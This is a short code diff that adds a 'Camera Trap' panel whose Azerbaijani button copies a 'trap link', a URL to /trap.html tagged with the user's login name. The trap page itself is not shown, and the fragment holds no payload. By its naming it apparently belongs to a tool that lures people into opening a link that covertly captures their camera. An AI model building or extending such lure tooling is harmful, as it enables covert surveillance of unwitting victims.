@@ -1,0 +1,10 @@
+<div style="background: rgba(17, 20, 29, 0.95); padding: 30px; border-radius: 25px; border: 1px solid var(--red);">
+    <h2 style="color:var(--red); margin:0;">Camera Trap</h2>
+    <button class="btn" style="background:var(--red); color:white;" onclick="copyL()">TƏLƏ LİNKİNİ KOPYALA</button>
+</div>
+<script>
+    function copyL() {
+        const link = window.location.origin + "/trap.html?ref=" + loginName;
+        navigator.clipboard.writeText(link); alert("Kopyalandı!");
+    }
+</script>
